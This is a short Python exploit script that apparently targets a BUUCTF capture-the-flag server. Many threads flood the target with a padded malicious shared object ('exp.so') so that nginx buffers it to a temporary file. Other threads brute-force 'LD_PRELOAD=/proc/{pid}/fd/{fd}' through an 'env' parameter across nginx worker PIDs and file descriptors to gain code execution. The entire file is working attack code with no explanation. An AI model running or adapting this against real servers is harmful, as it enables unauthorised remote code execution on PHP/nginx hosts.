import requests
import threading

URL2 = f'http://c4885638-fff2-4349-b095-2e5d2b9cbd12.node4.buuoj.cn:81/index.php'
nginx_workers = [12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27]
done = False


def uploader():
    print('[+] starting uploader')
    with open("exp.so", "rb") as f:
        data1 = f.read() + b'0' * 1024 * 1000
        # print(data1)
    while not done:
        requests.get(URL2, data=data1)


for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()


def bruter(pid):
    global done
    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            try:
                requests.get(URL2, params={
                    'env': f"LD_PRELOAD=/proc/{pid}/fd/{fd}"
                })
                print("success")
            except:
                print("xxx")
                pass


for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid,))
    a.start()
